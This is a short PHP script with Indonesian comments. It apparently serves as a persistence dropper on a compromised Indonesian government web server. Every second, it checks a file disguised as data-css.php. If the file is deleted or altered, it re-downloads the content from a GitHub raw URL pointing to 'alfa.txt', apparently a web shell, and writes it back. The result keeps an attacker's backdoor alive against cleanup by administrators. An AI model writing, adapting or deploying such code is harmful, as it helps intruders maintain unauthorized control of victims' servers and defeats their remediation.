<?php

// Lokasi file yang akan dipantau
$file = '/home/sise6385/public_html/sisakaeng.sangihekab.go.id/surat/data-css.php';

// URL untuk diunduh
$url = 'https://raw.githubusercontent.com/kennn404/test/refs/heads/main/alfa.txt';

// Fungsi untuk menghitung hash MD5 file
function getFileHash($file) {
    return md5_file($file);
}

// Hash file asli
$originalHash = getFileHash($file);

// Loop tak terbatas
while (true) {
    // Jika file index.php tidak ditemukan
    if (!file_exists($file)) {
        echo "File index.php tidak ditemukan. Mendownload...\n";
        file_put_contents($file, file_get_contents($url)); // Mengunduh file dan menyimpannya
        $originalHash = getFileHash($file); // Memperbarui hash file setelah diunduh
    } else {
        // Membandingkan hash file saat ini dengan hash asli
        $currentHash = getFileHash($file);

        if ($originalHash !== $currentHash) {
            echo "File index.php telah diubah. Mengembalikan ke versi asli...\n";
            file_put_contents($file, file_get_contents($url)); // Mengunduh ulang file
            $originalHash = getFileHash($file); // Memperbarui hash file
        } else {
            echo "File index.php tidak berubah. Tidak mendownload ulang.\n";
        }
    }

    // Menunggu selama 1 detik sebelum memeriksa lagi
    sleep(1);
}
